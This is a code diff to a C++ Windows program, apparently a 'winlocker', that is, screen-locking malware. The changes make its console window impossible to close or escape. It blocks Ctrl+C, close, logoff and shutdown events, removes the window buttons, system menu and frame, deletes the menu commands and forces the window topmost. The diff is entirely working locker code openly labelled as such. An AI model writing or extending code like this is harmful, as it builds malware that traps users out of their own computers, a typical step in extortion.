@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — Death + rules + menu + winlocker with reaper
+// werkaramel — Death + rules + menu + winlocker with reaper, locked cmd
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -89,7 +89,10 @@ void Gotoxy(int x, int y) {
 }
 
 BOOL WINAPI CtrlHandler(DWORD type) {
-    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT) return TRUE;
+    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT ||
+        type == CTRL_LOGOFF_EVENT || type == CTRL_SHUTDOWN_EVENT) {
+        return TRUE;
+    }
     return FALSE;
 }
 
@@ -101,16 +104,21 @@ void SetupConsole() {
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 
+    // убираем кнопки: закрыть, свернуть, развернуть + системное меню + рамка
+    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
+    style &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME);
+    SetWindowLong(g_hCon, GWL_STYLE, style);
+
     HMENU menu = GetSystemMenu(g_hCon, FALSE);
     if (menu) {
         DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
         DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
+        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
+        DeleteMenu(menu, SC_RESTORE, MF_BYCOMMAND);
     }
-    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
-    style &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
-    SetWindowLong(g_hCon, GWL_STYLE, style);
-    SetWindowPos(g_hCon, nullptr, 0, 0, 0, 0,
-                 SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER);
+
+    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, 0, 0,
+                 SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE);
 
     SetConsoleCtrlHandler(CtrlHandler, TRUE);
 }
